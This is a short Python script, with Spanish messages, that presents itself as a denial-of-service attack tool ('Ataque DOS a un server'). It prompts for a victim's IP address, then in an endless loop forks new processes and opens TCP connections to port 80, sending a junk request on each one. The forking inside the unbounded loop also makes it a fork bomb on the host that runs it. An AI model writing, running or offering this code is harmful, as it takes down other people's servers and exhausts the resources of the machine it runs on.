import socket, os
print("Ataque DOS a un server.... By JF")
servidor=input("ingresa la ip de la victima: ")
puerto = 80
conta=0

while True:
	print("soldados generados "+str(conta))
	print("Atacando a " + servidor + ".... "+"atacando "+str(conta))
	conta+=1
	pid = os.fork() 
	cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	cliente.connect((servidor, puerto))
	mensaje="GET/ hfkjsdhfkshdfksdkfhksdhfksdhfkshdkfhlllllllllllllllllllllllllllllksdhfksdkfhskdfhskdhfksdhfkshdkfhsdkfhksdhfkshdfkshdkfhsdkfhskdhfksdhfksdhfksdhfkshdkfskdhjsfdjhkfjhfdjhfdfjhksfdjhksfdfhksjdhfksdhfksdhkfjhsdjkfhksdhfksdhfkshfksdhfkshkfsdkfhksdh'"
	cliente.send(mensaje.encode());
	respuesta = cliente.recv(4096)
	print (respuesta.decode())
	cliente.close()
